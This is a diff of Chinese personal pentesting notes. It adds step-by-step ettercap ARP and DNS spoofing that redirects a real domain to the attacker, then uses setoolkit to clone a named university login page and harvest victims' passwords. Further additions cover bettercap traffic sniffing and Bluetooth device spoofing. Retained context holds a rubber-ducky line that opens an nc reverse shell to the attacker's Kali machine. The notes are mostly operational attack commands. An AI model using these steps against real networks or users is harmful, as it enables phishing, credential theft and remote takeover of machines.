@@ -345,24 +345,123 @@ ettercap -G
 arpspoof -i eth0(网卡名) -t 靶机ip 网关
 ```
 
-## （2）DNS劫持
+## （2）ettercap-DNS劫持到伪造网页获取用户名、密码
 
-* 在攻击机上启动Apache2服务：
+**靶机的浏览器需要没有dns缓存，才有效。**
+
+* 设置虚拟机网卡桥接模式
+
+* 关闭网络服务
+
+  ```bash
+  systemctl stop networking
+  ```
+
+* 修改配置文件
+
+  ```bash
+  vi /etc/network/interfaces
+  #加上
+  auto eth0
+  iface eth0 inet dhcp	#dhcp自动分配地址
+  ```
+
+* 重启网络服务
+
+  ```bash
+  systemctl start networking
+  ```
+
+* 修改ssh配置文件2处
+
+  ```bash
+  vi /etc/ssh/sshd_config
+  
+  #PermitRootLogin prohibit-password
+  修改为：
+  PermitRootLogin yes
+  
+  #PasswordAuthentication yes
+  注释去掉
+  ```
+
+* 启动ssh服务
+
+  ```bash
+  systemctl start ssh
+  ```
+
+* 修改ettercap配置文件etter.conf
+
+  ```bash
+  #将这2行的注释去掉。可以:/iptables搜索到这两行
+  redir_command_on = ...
+  redir_command_off = ...
+  ```
+
+* 修改配置文件
+
+  ```bash 
+  sudo vi /proc/sys/net/ipv4/ip_forward
+  #0改为1
+  ```
+
+* 向DNS劫持转发表，添加记录将靶机访问的域名指向攻击机IP：
+
+  ```bash
+  vim /etc/ettercap/etter.dns
+  www.baidu.com	A	攻击机IP
+  www.baidu.com	PTR	攻击机IP
+  ```
+
+  ![image-20240311011517517](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240311011517517.png)
+
+* 启动社工工具，添加伪造网页
+
+  ```bash
+  setoolkit
+  1	sockal engineering attack
+  2	website attack vectors
+  3	credential harvester
+  2	site cloner
+  ```
+
+  启动自己在攻击机上搭建的服务也可以：
+
+  会占用80端口，社工工具伪造的网页打开时需要关闭Apache服务
 
   ```bash
   systemctl start apache2
   ```
 
-* 修改ettercap配置文件。添加一条记录将域名指向攻击机IP：
+* 输入伪造网页url
+
+  靶机在伪造网页上输入用户名和密码后，社工工具将显示。
 
   ```bash
-  vim /etc/ettercap/etter.dns
-  www.baidu.com	A	攻击机IP
+  Enter the IP address for POST back in Harvester/Tabnabbing:#直接回车
+  https://cas.sysu.edu.cn/cas/login
   ```
 
-  ![image-20240311011517517](https://raw.githubusercontent.com/Neon2333/ImageHost/main/image-20240311011517517.png)
+* kaili开始菜单搜索ettercap graphical
 
-* 开始
+  选择网卡
+
+  点击对钩启动工具
+
+  点击放大镜搜索主机
+
+  放大镜右侧打开主机列表
+
+  将网关添加到target1，靶机添加到target2
+
+  右侧3个小圆点，选择Targets,Current Targets查看目标添加
+
+  点击地球，ARP poisoning
+
+  点击3个小圆点，Plugins，Manage plugins，双击dns spoof
+
+* 命令行（和上面一样）
 
   ```bash
   ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /靶机IP// /网关// ；
@@ -370,25 +469,26 @@ arpspoof -i eth0(网卡名) -t 靶机ip 网关
 
   靶机解析www.baidu.com域名时跳转到攻击机IP。
 
-## （3）bettercap
+## （3）bettercap-查看靶机的http请求和数据包
 
-### arp中间人查看目标http请求
+Bettercap is the successor to Ettercap and includes attack modules for various radio and network technology.
 
 ```bash
 bettercap
 
-net.probe on
+http.proxy.on	#http代理打开
+https.proxy on
+
+net.probe on	#关闭off
 
 net.show
 
- set arp.spoof.targets targetIP,gatewayIP 
+set arp.spoof.targets targetIP,gatewayIP 
 
 arp.spoof on
 
 net.sniff on
 ```
-
-### DNS劫持
 
 # 8. BrupSuite
 
@@ -498,6 +598,14 @@ https://blog.csdn.net/qq_53079406/article/details/123862255
 
 # 12. 蓝牙攻击
 
+```bash
+# c 文件，但我的系统中似乎没有 bluetooth.h 文件
+
+install libbluetooth-dev
+```
+
+
+
 概念：
 
 * BLE设备，小功率蓝牙设备
@@ -505,63 +613,64 @@ https://blog.csdn.net/qq_53079406/article/details/123862255
 
 ## （0）蓝牙相关命令
 
-| -命令                                  | -功能                                                      |
-| -------------------------------------- | ---------------------------------------------------------- |
-| ===============蓝牙适配器============= | ==========================                                 |
-| systemctl status bluetooth.service     | 查看蓝牙服务状态                                           |
-| systemctl enable bluetooth.service     | 启动蓝牙服务                                               |
-| bluetoothctl show                      | 查看所有蓝牙设备                                           |
-| hciconfig -a                           | 查看本地蓝牙设备信息                                       |
-| hcitool -i hci0 dev                    | 查看本地蓝牙设备                                           |
-| hciconfig hci0 up                      | 启动本地设备hci0                                           |
-| lsusb                                  | 查看所有连接的USB设备信息                                  |
-| -----------------------------------    |                                                            |
-| bluetoothctl                           | **进入交互模式**。退出exit。可以实时查看蓝牙扫描等工作状态 |
-| -----------------------------------    |                                                            |
-| list                                   | List available controllers                                 |
-| paired-devices                         | 查看当前配对设备                                           |
-| devices                                | 查看范围内的蓝牙设备                                       |
-| **scan on**                            | **主动搜索可以连接的蓝牙设备（效果好）**                   |
-| remove FC:69:47:7C:9D:A3               | 取消和指定mac设备的配对                                    |
-| disconnect FC:69:47:7C:9D:A3           | 断开指定mac设备                                            |
-| block FC:69:47:7C:9D:A3                | 阻止指定mac设备连接到系统                                  |
-| trust FC:69:47:7C:9D:A3                | 信任指定mac设备                                            |
-| untrust FC:69:47:7C:9D:A3              | 不信任指定mac设备                                          |
-| l2ping -i hci0 -s size -f addr         | 同网络协议栈中的ping                                       |
-|                                        |                                                            |
-|                                        |                                                            |
-|                                        |                                                            |
-|                                        |                                                            |
-|                                        |                                                            |
-|                                        |                                                            |
+| -命令                                                      | -功能                                                      |
+| ---------------------------------------------------------- | ---------------------------------------------------------- |
+| ===============蓝牙适配器=============                     | ==========================                                 |
+| systemctl status bluetooth.service                         | 查看蓝牙服务状态                                           |
+| systemctl enable bluetooth.service                         | 启动蓝牙服务                                               |
+| bluetoothctl show                                          | 查看所有蓝牙设备                                           |
+| hciconfig -a                                               | 查看本地蓝牙设备信息                                       |
+| hcitool -i hci0 dev                                        | 查看本地蓝牙设备                                           |
+| hciconfig hci0 up                                          | 启动本地设备hci0                                           |
+| hciconfig hci0 class 0x500204                              | 修改设备类型为手机                                         |
+| hciconfig hci0 name Huawei                                 | 修改设备名称                                               |
+|                                                            |                                                            |
+| lsusb                                                      | 查看所有连接的USB设备信息                                  |
+| -----------------------------------                        |                                                            |
+| bluetoothctl                                               | **进入交互模式**。退出exit。可以实时查看蓝牙扫描等工作状态 |
+| -----------------------------------                        |                                                            |
+| list                                                       | List available controllers                                 |
+| paired-devices                                             | 查看当前配对设备                                           |
+| devices                                                    | 查看范围内的蓝牙设备                                       |
+| **scan on**                                                | **主动搜索可以连接的蓝牙设备（效果好）**                   |
+| remove FC:69:47:7C:9D:A3                                   | 取消和指定mac设备的配对                                    |
+| disconnect FC:69:47:7C:9D:A3                               | 断开指定mac设备                                            |
+| block FC:69:47:7C:9D:A3                                    | 阻止指定mac设备连接到系统                                  |
+| trust FC:69:47:7C:9D:A3                                    | 信任指定mac设备                                            |
+| untrust FC:69:47:7C:9D:A3                                  | 不信任指定mac设备                                          |
+| l2ping -i hci0 -s size -f addr                             | 同网络协议栈中的ping                                       |
+| ---------------------------------------------------------- | ----------------------------------------------------       |
+| rfcomm                                                     |                                                            |
+|                                                            |                                                            |
+|                                                            |                                                            |
+|                                                            |                                                            |
+|                                                            |                                                            |
 
 
 
 ## （1）攻击类型
 
-### Bluetooth DDos Attach
+* Bluetooth DDos Attach
 
-在目标设备范围内，向其发送数据包/连接请求，令其无法工作或无法连接设备。
+  在目标设备范围内，向其发送数据包/连接请求，令其无法工作或无法连接设备。
 
-适用于没有rate limiting或implement sophisticated connection management的设备。
+  适用于没有rate limiting或implement sophisticated connection management的设备。
 
-### 蓝牙模拟攻击
+* 蓝牙模拟攻击
 
-bluetooth impersonation attack
+  bluetooth impersonation attack
 
-模拟目标设备的已信任的设备。需要知道已信任设备的信息。
-
-### HID Spoofing Attack
+  模拟目标设备的已信任的设备。需要知道已信任设备的信息。
 
 模拟蓝牙键盘，欺骗目标设备以为连接至一个合法设备。可远程控制目标设备，并执行恶意命令。
 
-### 蓝牙拦截攻击
+* 蓝牙拦截攻击
 
-bluetooth interception attack
+  bluetooth interception attack
 
-### BlueBorne攻击
+* BlueBorne攻击
 
-不具有广泛适用性，针对操作系统漏洞，但很多设备在旧版本系统上运行。
+  不具有广泛适用性，针对操作系统漏洞，因为很多设备在旧版本系统上运行。
 
 ## （2）工具
 
@@ -632,6 +741,7 @@ bluebugger——针对手机攻击的工具
 bluetoothctl
 
 scan on
+scan le
 ```
 
 ## 4）DDos
@@ -700,8 +810,6 @@ ngrok.com注册不了。替代：ngrok.cc。
 
 在官网ngrok.org无法注册。
 
-
-
 # 18. frp内网穿透
 
 需要一个有公网IP的服务器作为中转。
@@ -748,15 +856,7 @@ STRING nc -e powershell.exe <kaliIP> 4444<port>
 ENTER
 ```
 
-# 20. 反弹shell
-
-也称为反代shell。
-
-被攻击的计算机（被控端）主动连接到攻击者的机器（控制端）获取shell。
-
-**研究下原理和怎么用Python写。**
-
-# 21. MAC地址隐藏
+# 20. MAC地址隐藏
 
 **macchanger工具**
 
@@ -821,6 +921,34 @@ while True:
     schedule.run_pending()
     time.sleep(1)
 ```
+
+---
+
+# 20. 反弹shell
+
+也称为反代shell。
+
+被攻击的计算机（被控端）主动连接到攻击者的机器（控制端）获取shell。
+
+**研究下原理和怎么用Python写。**
+
+
+
+---
+
+# 21. nmap
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
